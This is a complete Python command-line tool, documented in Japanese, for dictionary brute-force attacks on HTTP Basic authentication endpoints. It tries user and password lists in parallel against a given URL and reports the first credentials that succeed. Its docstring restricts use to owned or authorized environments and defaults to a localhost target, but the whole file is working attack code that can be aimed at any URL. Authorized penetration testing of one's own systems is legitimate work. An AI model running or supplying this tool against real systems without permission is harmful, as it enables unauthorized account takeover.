#!/usr/bin/env python3
"""
Basic認証エンドポイント向けの辞書攻撃（ブルートフォース）ツール。

自分が所有・管理する環境、または書面で許可を得た環境での利用に限定してください。
許可のない第三者のシステムに対する利用は、法令に反する不正行為になる場合があります。

使用例:
  python scripts/basic_auth_bruteforce.py \\
    --url http://127.0.0.1:5001/admin \\
    --user admin \\
    --passwords-file passwords.txt

  # ユーザー名も複数試す
  python scripts/basic_auth_bruteforce.py \\
    --url http://127.0.0.1:5001/admin \\
    --users-file users.txt \\
    --passwords-file passwords.txt
"""
from __future__ import annotations

import argparse
import itertools
import sys
import threading
import time
from concurrent.futures import FIRST_COMPLETED, Future, ThreadPoolExecutor, wait
from pathlib import Path
from typing import Iterable

import httpx

HEADERS = {"User-Agent": "basic-auth-bruteforce-local-test/1.0"}

# 並列モード: ThreadPoolExecutor の initializer でワーカーごとに1クライアント（接続再利用）
_tls = threading.local()

# --help 用: 全オプションの参照（フォーマッタ幅100で usage の折り返しを抑える）
HELP_EPILOG = """
【必要（どちらか一方）】
  --password PASSWORD     単一パスワードのみ試す
  --passwords-file PATH   パスワード辞書（1行1件。先頭#行と空行は無視）

【任意・対象・認証情報】
  --url URL               Basic認証がかかるURL全体（パスまで含む）
                          既定: http://127.0.0.1:5001/admin
  --user NAME             ユーザー名を1つ指定（--users-file 併用可）
  --users-file PATH       ユーザー名リスト（1行1件。#行・空行は無視）
                          両方省略時は user=admin のみ

【任意・試行の仕方】
  --workers N             同時リクエスト数（既定: 4）。1以下、または --delay 指定時は逐次
  --timeout SEC           1リクエストあたりの秒（既定: 10.0）
  --delay SEC             試行ごとの待ち秒（逐次モード時のみ有効）
  --max-attempts N        試す組み合わせの上限（先頭から数える）
  --success-codes LIST    認証成功とみなすHTTPステータス（カンマ区切りの整数）
                          既定: 200,201,204,301,302,303,307,308
  --verbose               401なども行ごとに表示

【リストファイルの例】
  # users.txt / passwords.txt いずれも同じルール
  admin
  operator
  # コメント行

【コマンド例（オプションの組み合わせ）】
  単一ユーザー・単一パスワード:
    %(prog)s --url http://127.0.0.1:5002/admin --user admin --password 'secret'

  単一ユーザー・辞書・詳細ログ:
    %(prog)s --url http://127.0.0.1:5002/admin --user admin \\
      --passwords-file passwords.txt --verbose

  ユーザー辞書×パスワード辞書・試行上限・成功コード200のみ:
    %(prog)s --url http://127.0.0.1:5002/admin \\
      --users-file users.txt --passwords-file passwords.txt \\
      --max-attempts 1000 --success-codes 200

  逐次モード（低負荷の例: --workers 1 と --delay）:
    %(prog)s --user admin --passwords-file passwords.txt \\
      --workers 1 --delay 0.5

  並列数とタイムアウト変更:
    %(prog)s --user admin --passwords-file passwords.txt \\
      --workers 8 --timeout 15
"""


class _WideDefaultsHelpFormatter(
    argparse.ArgumentDefaultsHelpFormatter,
    argparse.RawDescriptionHelpFormatter,
):
    def __init__(self, prog: str) -> None:
        super().__init__(prog, max_help_position=30, width=100)


def _read_lines(path: Path) -> list[str]:
    text = path.read_text(encoding="utf-8", errors="replace")
    return [ln.strip() for ln in text.splitlines() if ln.strip() and not ln.lstrip().startswith("#")]


def _init_parallel_client() -> None:
    _tls.client = httpx.Client(headers=HEADERS, follow_redirects=False)


def _parallel_client() -> httpx.Client:
    c = getattr(_tls, "client", None)
    if c is None:
        raise RuntimeError("内部エラー: 並列ワーカー用の HTTP クライアントが未初期化です")
    return c


def _expand_users(args: argparse.Namespace) -> list[str]:
    users: list[str] = []
    if args.user:
        users.append(args.user)
    if args.users_file:
        users.extend(_read_lines(Path(args.users_file)))
    if not users:
        users = ["admin"]
    seen: set[str] = set()
    out: list[str] = []
    for u in users:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _expand_passwords(args: argparse.Namespace) -> list[str]:
    if args.password is not None:
        return [args.password]
    return _read_lines(Path(args.passwords_file))


def _try_one(
    url: str,
    username: str,
    password: str,
    timeout: float,
    client: httpx.Client | None,
) -> tuple[str, str, int, str | None]:
    """client が None のときは並列ワーカー内のスレッドローカル Client を使う。"""
    try:
        c = client if client is not None else _parallel_client()
        r = c.get(url, auth=(username, password), timeout=timeout)
        loc = r.headers.get("location")
        return username, password, r.status_code, loc
    except httpx.RequestError as e:
        return username, password, -1, str(e)


def _pairs(users: list[str], passwords: list[str], max_attempts: int | None) -> Iterable[tuple[str, str]]:
    count = 0
    for u, p in itertools.product(users, passwords):
        yield u, p
        count += 1
        if max_attempts is not None and count >= max_attempts:
            break


def _run_sequential(
    url: str,
    users: list[str],
    passwords: list[str],
    max_attempts: int | None,
    timeout: float,
    delay: float,
    success_codes: set[int],
    verbose: bool,
) -> bool:
    with httpx.Client(headers=HEADERS, follow_redirects=False) as client:
        for attempt, (username, password) in enumerate(
            _pairs(users, passwords, max_attempts), start=1
        ):
            u, p, status, extra = _try_one(url, username, password, timeout, client)
            if status == -1:
                print(f"[{attempt}] {u} / *** ERROR: {extra}")
            elif verbose or status in success_codes:
                print(f"[{attempt}] {u} / *** HTTP {status}")
            if status in success_codes:
                print(f"\n認証に成功: user={u!r} password={p!r} status={status}")
                if extra:
                    print(f"Location: {extra}")
                return True
            if delay > 0:
                time.sleep(delay)
    return False


def _run_parallel(
    url: str,
    users: list[str],
    passwords: list[str],
    max_attempts: int | None,
    workers: int,
    timeout: float,
    success_codes: set[int],
    verbose: bool,
) -> bool:
    pair_iter = iter(_pairs(users, passwords, max_attempts))
    attempt = 0

    def enqueue(ex: ThreadPoolExecutor):
        nonlocal attempt
        try:
            u, p = next(pair_iter)
        except StopIteration:
            return None
        attempt += 1
        seq = attempt
        fut = ex.submit(_try_one, url, u, p, timeout, None)
        return fut, seq

    with ThreadPoolExecutor(max_workers=workers, initializer=_init_parallel_client) as ex:
        pending: set[Future[tuple[str, str, int, str | None]]] = set()
        meta: dict[Future[tuple[str, str, int, str | None]], int] = {}

        for _ in range(workers):
            item = enqueue(ex)
            if item is None:
                break
            fut, seq = item
            pending.add(fut)
            meta[fut] = seq

        while pending:
            done, pending = wait(pending, return_when=FIRST_COMPLETED)
            for fut in done:
                seq = meta.pop(fut)
                u, p, status, extra = fut.result()
                if status == -1:
                    print(f"[{seq}] {u} / *** ERROR: {extra}")
                elif verbose or status in success_codes:
                    print(f"[{seq}] {u} / *** HTTP {status}")
                if status in success_codes:
                    print(f"\n認証に成功: user={u!r} password={p!r} status={status}")
                    if extra:
                        print(f"Location: {extra}")
                    ex.shutdown(wait=False, cancel_futures=True)
                    return True
                nxt = enqueue(ex)
                if nxt is not None:
                    nf, nseq = nxt
                    pending.add(nf)
                    meta[nf] = nseq
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Basic 認証の辞書攻撃（許可された環境のみ）",
        formatter_class=_WideDefaultsHelpFormatter,
        epilog=HELP_EPILOG,
    )
    parser.add_argument(
        "--url",
        default="http://127.0.0.1:5001/admin",
        help="Basic認証がかかるURL（パス含む）",
    )
    parser.add_argument(
        "--user",
        metavar="NAME",
        help="試すユーザー名を1つ指定（--users-file 併用可。未指定かつファイルもなし→admin）",
    )
    parser.add_argument(
        "--users-file",
        metavar="PATH",
        help="ユーザー名リスト（1行1件、# 始まりはコメント）",
    )
    pw = parser.add_mutually_exclusive_group()
    pw.add_argument(
        "--password",
        default=None,
        metavar="PASSWORD",
        help="試すパスワードを1つだけ指定（辞書より優先してこの1件のみ試行）",
    )
    pw.add_argument(
        "--passwords-file",
        default=None,
        metavar="PATH",
        help="パスワード辞書（1行1件、# 始まりはコメント）",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=4,
        metavar="N",
        help="同時リクエスト数。1以下または --delay 指定時は逐次",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        metavar="SEC",
        help="HTTP 1リクエストあたりのタイムアウト（秒）",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        metavar="SEC",
        help="逐次モード時のみ、試行ごとにこの秒数スリープ",
    )
    parser.add_argument(
        "--max-attempts",
        type=int,
        default=None,
        metavar="N",
        help="(ユーザー,パスワード)の試行回数の上限（先頭から）",
    )
    parser.add_argument(
        "--success-codes",
        default="200,201,204,301,302,303,307,308",
        metavar="LIST",
        help="認証成功とみなすHTTPステータス（半角カンマ区切りの整数）",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="401など失敗応答も行ごとに表示",
    )
    args = parser.parse_args()

    if args.password is None and args.passwords_file is None:
        parser.error("--password または --passwords-file のいずれかを指定してください。")

    raw_codes = [x.strip() for x in args.success_codes.split(",") if x.strip()]
    try:
        success_codes = {int(x) for x in raw_codes}
    except ValueError:
        parser.error("--success-codes は半角カンマ区切りの整数のみ指定してください。")
    if not success_codes:
        parser.error("--success-codes に少なくとも1つのステータスコードを指定してください。")

    users = _expand_users(args)
    passwords = _expand_passwords(args)
    if not passwords:
        parser.error("試行するパスワードがありません（空の辞書または空の --password）。")

    total = len(users) * len(passwords)
    if args.max_attempts is not None:
        total = min(total, args.max_attempts)

    print(f"対象: {args.url}")
    print(f"ユーザー数: {len(users)} / パスワード数: {len(passwords)} / 試行上限: {total}")
    print("-" * 48)

    try:
        if args.workers <= 1 or args.delay > 0:
            ok = _run_sequential(
                args.url,
                users,
                passwords,
                args.max_attempts,
                args.timeout,
                args.delay,
                success_codes,
                args.verbose,
            )
        else:
            ok = _run_parallel(
                args.url,
                users,
                passwords,
                args.max_attempts,
                args.workers,
                args.timeout,
                success_codes,
                args.verbose,
            )
    except KeyboardInterrupt:
        print("\n中断されました (KeyboardInterrupt)", file=sys.stderr)
        sys.exit(130)

    if ok:
        sys.exit(0)
    print("\n成功する組み合わせは見つかりませんでした。")
    sys.exit(1)


if __name__ == "__main__":
    main()
